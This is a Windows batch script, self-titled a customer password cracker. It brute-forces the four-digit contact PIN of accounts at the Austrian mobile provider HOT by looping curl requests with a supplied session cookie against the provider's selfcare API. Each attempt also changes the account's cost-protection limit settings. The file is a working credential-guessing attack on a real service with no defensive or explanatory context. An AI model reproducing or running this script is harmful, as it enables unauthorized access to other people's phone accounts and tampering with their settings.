@echo off

echo Welcome to HOT Kundenpasswort-Cracker v0.02!
echo This will only work if the password is a number between 0000 and 9999
echo.

set /p sid= Please enter PHPSESSID: 
set /p c= Start from: 

:loop

set p=000%c%
set p=%p:~-4%

echo.
echo Trying: %p%

for /f %%i in ('curl "https://www.hot.at/api/?Mode=Selfcare&Function=setLimit" -H "Cookie: PHPSESSID=%sid%" -H "Origin: https://www.hot.at" -H "Accept-Encoding: gzip, deflate, br" -H "Accept-Language: de-DE,de;q=0.8,en-US;q=0.6,en;q=0.4,fr;q=0.2" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -H "Accept: application/json, text/javascript, */*; q=0.01" -H "Referer: https://www.hot.at/selfcare/kostenschutz.html" -H "X-Requested-With: XMLHttpRequest" -H "Connection: keep-alive" --data "LimitType=1&Status=0&CutoffLevel=10&NotifyMethod=Both&NotifyEmail=office"%%"40company.com&ContactPin=%p%" --compressed --silent') do set o=%%i

if !%o:~13,2%==!se (
   if !%o:~44,4%==!fals (
      echo.
      echo Failed
   ) else (
      echo.
      echo.
      echo Got it!
      echo The Password is: %p%
      echo Please check your Kostenschutz settings
   )

   goto end
)

if %c%==9999 goto end
set /a c=c+1

goto loop
:end
pause